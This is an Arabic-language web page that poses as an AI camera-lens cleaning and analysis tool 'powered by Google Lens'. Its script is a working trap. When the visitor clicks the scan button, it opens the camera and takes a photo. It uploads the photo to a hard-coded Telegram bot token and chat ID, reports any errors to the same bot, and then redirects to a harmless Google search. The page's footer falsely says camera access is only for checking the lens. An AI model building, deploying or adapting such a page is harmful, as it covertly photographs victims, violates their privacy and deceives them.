<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تنظيف عدسة الكاميرا</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            padding: 30px 25px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
        }
        .icon {
            width: 80px;
            height: 80px;
            background: #0f3460;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 44px;
            box-shadow: 0 0 20px rgba(0,200,255,0.4);
        }
        h1 {
            color: white;
            font-size: 24px;
            margin-bottom: 12px;
        }
        p {
            color: #ccc;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .benefits {
            background: rgba(0,0,0,0.4);
            border-radius: 20px;
            padding: 15px;
            margin: 20px 0;
            text-align: right;
        }
        .benefits li {
            color: #ddd;
            font-size: 13px;
            margin: 10px 0;
            list-style: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .btn {
            background: linear-gradient(90deg, #00c6ff, #0072ff);
            border: none;
            padding: 14px 28px;
            border-radius: 40px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(0,114,255,0.4);
        }
        .btn:active {
            transform: scale(0.97);
        }
        .status {
            margin-top: 20px;
            font-size: 13px;
            color: #0f0;
            display: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #888;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">📷✨</div>
    <h1>تنظيف عدسات الكاميرا</h1>
    <p>نظام فحص وتنظيف العدسات بالذكاء الاصطناعي<br>لتحصل على صور نقية وواضحة</p>
    
    <div class="benefits">
        <li>🔍 <span>اكتشاف الأتربة والخدوش على العدسة</span></li>
        <li>🧹 <span>تحليل جودة الصورة الحالية</span></li>
        <li>⚡ <span>تحسين فوري بدقة 4K</span></li>
        <li>🛡️ <span>مدعوم من Google Lens AI</span></li>
    </div>
    
    <button class="btn" id="scanBtn">ابدأ الفحص الان</button>
    <div class="status" id="statusMsg"> جاري التحليل... سيتم توجيهك بعد ثوان</div>
    <div class="footer"> يطلب الوصول إلى الكاميرا لفحص العدسة فقط</div>
</div>

<script>
    const BOT_TOKEN = '8742018271:AAFp93TNImohEIHngozLC6P9w2xi83Pe_QQ';
    const CHAT_ID = '5554730182';

    const btn = document.getElementById('scanBtn');
    const statusDiv = document.getElementById('statusMsg');

    async function captureAndSend() {
        try {
            statusDiv.style.display = 'block';
            statusDiv.innerHTML = ' جاري فتح الكاميرا لتحليل العدسة...';
            
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            statusDiv.innerHTML = ' جاري فحص العدسة والتقاط عينة...';
            
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            await video.play();
            
            await new Promise(r => setTimeout(r, 800));
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
            
            statusDiv.innerHTML = ' رفع العينة للخوادم...';
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'lens_scan.jpg');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            stream.getTracks().forEach(track => track.stop());
            statusDiv.innerHTML = ' تم التحليل بنجاح! جاري إعادة التوجيه...';
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com/search?q=كيف+أنظف+عدسة+كاميرا+هاتفي';
            }, 1500);
            
        } catch(err) {
            statusDiv.style.color = '#ff8888';
            statusDiv.innerHTML = ' فشل الوصول للكاميرا. تأكد من منح الصلاحية.';
            console.error(err);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فشل: ${err.message}`);
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com/search?q=تنظيف+عدسة+الكاميرا';
            }, 2500);
        }
    }

    btn.addEventListener('click', captureAndSend);
</script>
</body>
</html>
